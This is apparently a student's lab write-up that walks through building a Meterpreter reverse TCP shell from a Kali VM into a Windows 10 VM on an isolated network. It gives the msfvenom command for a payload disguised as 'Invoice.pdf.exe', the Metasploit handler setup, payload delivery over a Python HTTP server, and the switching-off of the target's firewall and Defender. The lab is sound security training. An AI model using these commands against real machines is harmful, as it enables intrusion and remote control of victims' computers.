---

title: "How to create a Reverse TCP shell between Attacker and Target Virtual Machines for Malware Analysis"
date: "2025-07-22 00:00:00"
categories: [Malware Analysis, Reverse TCP shell between Attacker and Target Virtual Machines for Malware Analysis]
tags: [Malware Analysis]

---


# Overview

In this Cybersecurity lab project, I practically learned how to create a reverse TCP shell between attacker and target Virtual Machines, by using proper networking configuration in a sandboxing environment, and using different tools. Initially, I started this project by setting up the two Virtual Machines using Oracle Virtual Box one was the attacker VM which was the Kali Linux OS, and the other one was the target VM which was Windows 10 OS. Then I configured the correct network settings between these two VM's so that they were properly connected with each other without affecting the local host for malware analysis. Finally, I successfully created a reverse TCP shell on the attacker Kali Linux VM so that it remotely controlled the target Windows 10 VM. The following are the types of tools that I used to complete this project.


**1) Oracle Virtual Box for setting up attacker and target Virtual Machines with proper network configuration.**<br>
**2) Nmap to target the open port on the target virtual machine.**<br>
**3) Msfvenom CLI from Metasploit Framework for setting up the malware payload.**<br>
**4) Using Python CLI for setting up the HTTP server on attacker VM.**<br>
**5) Creating a reverse TCP shell to control the target VM (Windows 10) from the attacker VM (Kali Linux).**<br>


# Steps for setting up the Network configurarion and assigning static IP's to the Attacker and Target Virtual Machines

In these steps I setted up the network configuration on Oracle Virtual Box for the attacker (Kali Linux) and Target (Windows 10) virtual machines, assigning the static IPv4 addresses to those virtual machines, verifying the IPv4 addresess using commands "ifconfig" and "ipconfig" and then ping it to check if the connection was successfully established.

# 1. Using Internal Network setting for both Attacker and Target Virtual Machines

In this step before starting both attacker and target virtual machines, I first configured the network settings and set it to Internal Network for both attacker and the target virtual machines from the Oracle Virtual Box network settings. I used this option because both the machines will ran on the same internal network and were not connected with the local host machine which is safe for malware analysis. 

Network configuration settings on the attacker Kali Linux Virtual Machine:
![netconf_kali](assets/img/CybLabRevShell/Kali_VM_int_net.png)

Network configuration settings on the target Windows 10 Virtual Machine:
![netconf_wind](assets/img/CybLabRevShell/Wind_10_VM_int_net.png)

# 2. Assigning static IPv4 address to the Attacker and Target Virtual Machines
  
After configuring the network settings I assignined the static IPv4 address to both the attacker and target virtual machines soo that they can communicate with each other in the internal network.

# 2a. Assigning IPv4 address for the Target Virtual Machine 

To assigning the IPv4 address for the target Windows 10 VM, first I right cliked on globe icon from the bottom task bar to open network and internt settings, then clicked on the change adapter options, then clicked on Ethernet properties and then clicked on Internet Protocol 4, then clicked properties to assign the IPv4 address "192.168.20.12" with the subnet mask of /24. After assigning the IPv4 address I checked and verify it by using "ipconfig" command from the cmd CLI.


Open Network and Internet Settings on the Target Windows 10 VM: 
![netint_sett](assets/img/CybLabRevShell/Open_Net_Int_sett.png)

Assigning IPv4 address to the Target Windows 10 VM:
![assstatip_wind](assets/img/CybLabRevShell/ass_stat_IP.png)
  
Checking IPv4 address using ipconfig command on Target Windwos 10 VM:
![ipcon_chk](assets/img/CybLabRevShell/ipcon_chk_ipv4.png)


# 2b. Assigning IPv4 address for the Attacker Virtual Machine

To assigning the Ipv4 address for the attacker Kali Linux VM, from the top I right clicked on the network settings then Edit connections, then I selected wired connection and clicked on the gear icon, and select the IPv4 settings then changed the method to manuel and then clicked on Add to assign new IPv4 address "192.168.20.13" with the subnet mask of /24, and then saved the settings and verify it by using "ifconfig" command from the Kali Linux terminal.

Edit connection on the attacker Kali Linux VM:
![ediconchk_kal](assets/img/CybLabRevShell/edi_conn.png)

Assigning IPv4 address to the Kali Linux VM: 
![assip_kal](assets/img/CybLabRevShell/ass_stat_ipv4_kali.png)

Checking IPv4 address using ifconfig command on attacker Kali Linux VM:
![ifconf_kal](assets/img/CybLabRevShell/ifconfig_ipv4_chck.png)

# Steps for checking Connection between Attacker and Target Virtual Machines

In these steps I tried to check if the connection was established between the attacker and the target virtual machines by first pinging from the attacker Kali Linx VM to the target Windows 10 VM.

# 1. Pinging from the Attacker Virtual Machine to the Target Virtual Machine

First I was trying to ping from the attacker Kali linux VM by using the command "ping 192.168.20.12". I noticed that I was unable to ping to the target Windows 10 VM because Windows firewall settings blocking the ICMP traffic from the attacker Kali Linux VM, so I decided to check the connection from the target Windows 10 VM.

Pinging from the attacker Kali Linux VM to target Windows 10 VM for checking connection:
![ping_kalwind](assets/img/CybLabRevShell/ping_kali_wind_no_conn.png)

# 2. Pinging form the Target Virtual Machine to the Attacker Virtual Machine

I this step I trying to ping the attacker Kali Linux VM from the Target Windows 10 VM, by using the command "ping 192.168.20.13" after running the command I was successfully able to ping and established the connection between two virtual machines. 

Pinging from the from target Windows 10 VM to attacker Kali Linux VM for checking connection:
![ping_windkal](assets/img/CybLabRevShell/ping_wind_to_kali_conn.png)

# Using Nmap to check open ports on the Target Virtual Machine

In this step I used the Nmap to scan the open ports on the target Windows 10 VM from the attacker Kali Linux VM by using the command "nmap 192.168.20.12 -n" with -n flag to stop DNS resolution. Initially I was unabled to find the open ports on the target Windows 10 VM, because the ports are filtered by the Windows 10 VM firewall. From the target Windows 10 VM I turned off the Microsoft Defender Firewall for the public network.

Turning off Windows Defender Firewall for Public Network on target Windows 10 VM: 
![winfir_off](assets/img/CybLabRevShell/wind_fire_off_pub_2.png)


After turning off the Windows Defender Firewall public network settings, I again started the port scaning from the Attacker Kali VM with the same command and found three open ports. Port 135 (msrpc), port 139 (NetBIOS), and port 445 (microsoft-ds). I was trying to find the port 3389 (RDP) for the remote connection but the copy of Windows 10 OS version that I installed on the Oracle Virtual Box cannot support the RDP connection, so I targeted the port 135 (msrpc) to accept the remote calls from the attacker Kali VM. 

Using Nmap to find open port 135 (msrpc) on the target Windows 10 VM:
![nmap_opprt](assets/img/CybLabRevShell/nmap_open_prt_135.png)

# Steps for downloading and setting up the malware payload using Msfvenom CLI from Metasploit Framework

In this steps first I used msfvenom CLI from the Metasploit framework to download the malware payload, from the payloads list using msfvenom then from the list I selected the payload, and created the executable payload file "Invoice.pdf.exe" from the selected payload with IP address of the attacker Kali Linux VM to save the payload on the, so that I will used this payload to attack the target Windows 10 VM.


# 1. Using Msfvenom to download payload from the payload List

From the terminal I used the command "msfvenom -l payloads" to list all the payloads so that I selected the payload that I would like to use. From the payloads list I select "meterpreter_reverse_tcp" payload that is use to create a shell using reverse tcp of the target machine on the attacker machine, so that the attacker can control the target machine, in this case the attacker was the Kali Linux VM and target is the Windows 10 VM.

Using Msfvenom to find the list of payloads to use to attack the Target Windows 10 VM:
![msfve_payldlst](assets/img/CybLabRevShell/msven_payld_lst.png)

Using reverse_tcp_payload from msfvenom to attack the target Windows 10 VM:
![revtcp_payld](assets/img/CybLabRevShell/rev_tcp_payload.png)


# 2. Selecting a payload and creating a executable file using the payload

In this step I ran this command using msfvenom CLI "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.13 lport=4444 -f exe -o Invoice.pdf.exe". This command select the payload, and then using Lhost which is our attacker Kali Linux VM IPv4 address with lport of "4444" to connect and then create a executable file using -f flag and then save the payload to that executable file in this case it was Invoice.pdf.exe. To hide the executable format I used ".pdf" before ".exe". After runing this command the executable payload file was successfully created on the desktop of the attacker Kali Linux VM.

Msfvenom command to select and create the payload malware file on the attacker Kali Linux VM:
![revtcp_paycomm](assets/img/CybLabRevShell/rev_tcp_pay_file.png)

Payload malware creted on the desktop of the attacker Kali Liunx VM:
![payld_credesk](assets/img/CybLabRevShell/paylod_creat_desk.png)

# Steps for using a multi/handler and changing the name of the payload and ran the exploit

In this step I need to use the multi/handler to exploit, establish, and manage session with the target Windows 10 VM, First I used the multi/handler and then giving the Lhost to that hadler that was the attacker Kali Linux VM IPv4 address, and then changing the name of the exploit to the name of the payload that I used in my previous steps, and finally ran the exploit.

# 1. Using a multi/handler to establish the connection with the Target Virtual Machine

In this step first I opened up the Metasploit by using the command "msfconsole" then used the multi/handler by using command "use exploit/multi/handler" then I used the command "options" first to check the lhost and there was no Lhost set, to do that I used the command "set lhost 192.168.20.13" to set the Lhost for the exploit that Lhost would be the attacker Kali Linux VM IPv4 address.

Using multi/handler from Metasploit Framework for setting up the exploit for the malware payload:
![multihand](assets/img/CybLabRevShell/cre_expl_handl.png)

Setting up the Lhost for the exploit: 
![set_lhost](assets/img/CybLabRevShell/lhost_set_attck_vm.png)

# 2. Changing the name of the payload for the multi/handler and ran the exploit

From the above steps I also changed the name of the payload for the multi/handler exploit from "generic/shell_reverse_tcp" to "windows/x64/meterpreter/reverse_tcp" I again used the command "options" first then to checked the name of the payload which was "gneric/shell_reverse_tcp" to change it I used the command "set paylod windows/x64/meterpreter/reverse_tcp". After changing the name of the payload I then ran the exploit by using the command "exploit"


Changing the payload to Windows/x64/meterpreter/reverse_tcp:
![payldopt_chan](assets/img/CybLabRevShell/pay_opt_chan_win_rev.png)
 
 
Runing the multi/handler exploit on the attacker Kali machine to listen for the Target Windows 10 VM:
![exp_run](assets/img/CybLabRevShell/exploit_run.png)


# Setting up the HTTP server on the Attacker Virtual Machine by using Python CLI

I also need to create an HTTP server on the attacker Kali Linux VM so that the Target Windows 10 VM can download the payload malware as a attack vector. To start that I opened up another terminal on the attacker Kali Linux VM and using the Python on terminal with the command "python3 -m http.server 9999" with the port number "9999" that was not in use to setup the server.

Setting up the HTTP Server using Python on the attacker Kali Linux VM:
![sethttp_serv](assets/img/CybLabRevShell/serv_setu_for_test_mach_down_pay.png)

After performing all the above steps the attacker Kali Linux VM was ready and wait for the Target Windows 10 VM to download and execute the payload malware.


# Steps to download and execute the payload malware on the Target Virtual Machine

In these steps Initially I disabled the Windows Defender Service on the Target Windows 10 VM first soo that it allow us to download the malware. Then I used the attacker Kali Linux VM IPv4 address with the port number "9999" on the web browser that we set in the previous steps for setting up the http connection soo that the target Windows 10 VM can download the malware.

# 1. Disabling the Windows Defender Service on the Target Virtual Machine

In this step I first disabling the Windows Defender Servide on the Target Windows 10 VM by going to the Virus and threat protection then Turn off the Real-time protection.

Turning off the Windows Defender service on the Target Windows 10 VM: 
![winddef_off](assets/img/CybLabRevShell/wind_def_off.png)

# 2. Downloading the payload malware from the Attacker HTTP server

After that I opened up the web browser and giving the attacker Kali linux VM IPv4 address with the port number "9999" on the address bar of the target Windows 10 VM to conect to the attacker Kali Linux VM http server. After going to the IPv4 address I was able to saw the payload malware file that I was created on the Attacker Kali Linux VM, I then downloaded that file on the Target Windows 10 VM. After downloading that file, the file extension of the file was ".pdf" because I used to hide that ".exe" file extension so that the Target Windows 10 VM treat this file as a ".pdf". In the real world scenerio attackers mostly used this technique to hide the executable file file extensions. In the next step I opened up the file extension by going to the view then file name extension and then check mark the box, for the testing purpose I kept the file extension on.


Malware payload is downloaded on the target Windows 10 VM:
![mal_down](assets/img/CybLabRevShell/mal_down.png)

 
File extension is off on the Target Windows 10 VM:
![filext_off](assets/img/CybLabRevShell/file_ext_off.png)

 
File extension is on on the target Windows 10 VM:
![fileext_on](assets/img/CybLabRevShell/file_ext_on.png)

# 3. Execute and tracking the process of the payload malware on the Target Virtual Machine

In this step I executed the payload malware from the attacker Kali Linux VM to the Target Windows 10 VM. To track the malware process and to check if it established the connection with the attacker Kali Linux VM first I opened up the cmd propmt on the Target Windows 10 VM machine and then type the command "netstat -anob" from there I found that the connection was established between the attacker Kali Linux VM and the Target Windows 10 VM with the process ID of "5124". 

Connection established with the attacker Kali Linux VM after running the malware payload with the process ID of "5124" on target Windows 10 VM:
![windest_conn](assets/img/CybLabRevShell/wind_est_conn_atta_cmd.png)

After that to track the process of the payload malware I opened up the Task Manager on the Target Windows 10 VM and found that process of the payload malware with the same Process ID of "5124" same as from the above step.


Track the process of the malware payload on the Target Windows 10 VM in the Task Manager with the same process ID of "5124": 
![trcpro_tskman](assets/img/CybLabRevShell/trc_pay_proc_tsk_man.png)

# Setting up a Reverse TCP Shell on the Attacker machine to control Target Virtual Machine

Finally, After successfully establishing the connection with the Target Windows 10 VM, I went back to the terminal of the Attacker Kali Linux VM where I seted up the multi/handler I ran the command "shell" to establish the reverse shell of the Target Windows 10 VM. After running that command I successfully created a reverse shell of the target Windows 10 VM on the attacker Kali Linux VM. I further ran two more command "net user" to verify the user name and "net localgroup" to check all the local group on the target Windows 10 VM.


Reverse Shell created successfully on the Attacker Kali Linux VM and ran other two commands to verify the username and localgroup of the target Windows 10 VM:
![shell_cret](assets/img/CybLabRevShell/succ_create_shell_3_cmds.png)


# Conclusion

In this Cybersecurity lab project, I successfully created a reverse TCP shell between Attacker and Target Virtual Machines for Malware Analysis. I also practically learned how to select and create the payload malware using the CLI tool Msfvenom from the Metasploit framework on the attacker machine and send it to the victim or target machine, and then how to create the reverse TCP shell to remotely control the target machine.














   





